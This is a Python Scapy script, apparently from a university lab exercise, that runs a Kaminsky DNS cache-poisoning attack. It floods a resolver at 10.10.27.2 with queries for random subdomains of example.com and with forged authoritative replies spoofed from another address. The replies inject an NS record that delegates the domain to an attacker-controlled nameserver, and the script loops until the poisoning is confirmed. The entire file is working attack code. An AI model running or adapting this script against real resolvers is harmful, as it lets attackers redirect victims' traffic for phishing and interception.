#!/usr/bin/env python3
from scapy.all import *
import random
import string
import time

target_dns = "10.10.27.2"
attacker_ip = "10.10.27.4"
fake_auth_ip = "199.43.135.53"  

def generate_random_subdomain():
    return ''.join(random.choices(string.ascii_lowercase, k=12))

def send_kaminsky_attack():
    subdomain = generate_random_subdomain()
    query_name = f"{subdomain}.example.com"
    
    dns_id = random.randint(1, 65535)
    src_port = random.randint(30000, 60000)
    
    print(f"[*] Sending attack for: {query_name} (ID: {dns_id}, Port: {src_port})")
    
    query_pkt = IP(dst=target_dns, src=attacker_ip) / \
                UDP(sport=src_port, dport=53) / \
                DNS(id=dns_id, rd=1, qd=DNSQR(qname=query_name, qtype="A"))
    
    send(query_pkt, verbose=0)
    
    forged_pkt = IP(src=fake_auth_ip, dst=target_dns) / \
                 UDP(sport=53, dport=src_port) / \
                 DNS(id=dns_id, 
                     qr=1,    
                     aa=1,     
                     rd=0,
                     qd=DNSQR(qname=query_name, qtype="A"),
                     an=DNSRR(rrname=query_name, ttl=600, rdata="20.23.3.19"),
                     ns=DNSRR(rrname="example.com", ttl=600, type="NS", rdata="ns.hust-cse.net"),
                     ar=DNSRR(rrname="ns.hust-cse.net", ttl=600, rdata="10.10.27.4"))
    
    send(forged_pkt, verbose=0)
    print(f"[+] Sent forged response")

def mass_attack():
    print("[*] Starting Kaminsky attack...")
    print("[*] Target DNS: 10.10.27.2")
    print("[*] Fake NS: ns.hust-cse.net -> 10.10.27.4")
    
    attack_count = 0
    success_count = 0
    
    try:
        while success_count < 1: 
            for i in range(10):
                send_kaminsky_attack()
                time.sleep(0.01)
            
            attack_count += 1
            print(f"[*] Attack batch {attack_count} completed")
            
            if attack_count % 5 == 0:
                if check_attack_success():
                    success_count += 1
                    print("[SUCCESS] Attack succeeded! DNS cache poisoned.")
                    break
            
            time.sleep(0.5)  
            
    except KeyboardInterrupt:
        print("\n[*] Attack stopped by user")

def check_attack_success():
    try:
        pkt = IP(dst=target_dns, src=attacker_ip) / \
              UDP(sport=random.randint(30000, 60000), dport=53) / \
              DNS(rd=1, qd=DNSQR(qname="example.com", qtype="NS"))
        
        response = sr1(pkt, timeout=2, verbose=0)
        
        if response and response.haslayer(DNS):
            for i in range(response[DNS].ancount):
                if response[DNS].an[i].type == 2: 
                    ns_name = response[DNS].an[i].rdata.decode()
                    if 'ns.hust-cse.net' in ns_name:
                        return True
        return False
    except:
        return False

if __name__ == "__main__":

    mass_attack()
